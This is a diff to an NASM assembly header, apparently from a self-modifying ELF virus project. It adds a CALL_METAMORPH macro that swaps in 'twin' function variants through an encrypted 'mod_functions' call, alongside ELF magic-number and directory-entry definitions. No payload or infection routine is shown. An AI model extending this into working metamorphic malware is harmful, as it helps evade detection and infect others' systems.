@@ -47,7 +47,17 @@
 
 %define MAGIC_NUMBERS   0x464c457f ; little endian
 
-%define CALL_ENCRYPT(x) CALL (__F_ %+ x), (__F_ %+ x %+ __end - __F_ %+ x)
+%define CALL_ENCRYPT(fun_name) CALL (__F_ %+ fun_name), (__F_ %+ fun_name %+ __end - __F_ %+ fun_name)
+
+%define CALL_METAMORPH(fun_name, nbr_of_twins) __MACRO_CALL_METAMORPH fun_name, nbr_of_twins
+%macro __MACRO_CALL_METAMORPH 2
+    lea rsi, [rel __F_%+%1%+_0]
+    lea rdi, [rel __F_%+%1]
+    mov rcx, F_%+%1%+_len
+    mov ebx, %2
+    CALL_ENCRYPT(mod_functions)
+%endmacro
+
 
 struc	dirent
     .d_inode	resq    1	; inode number
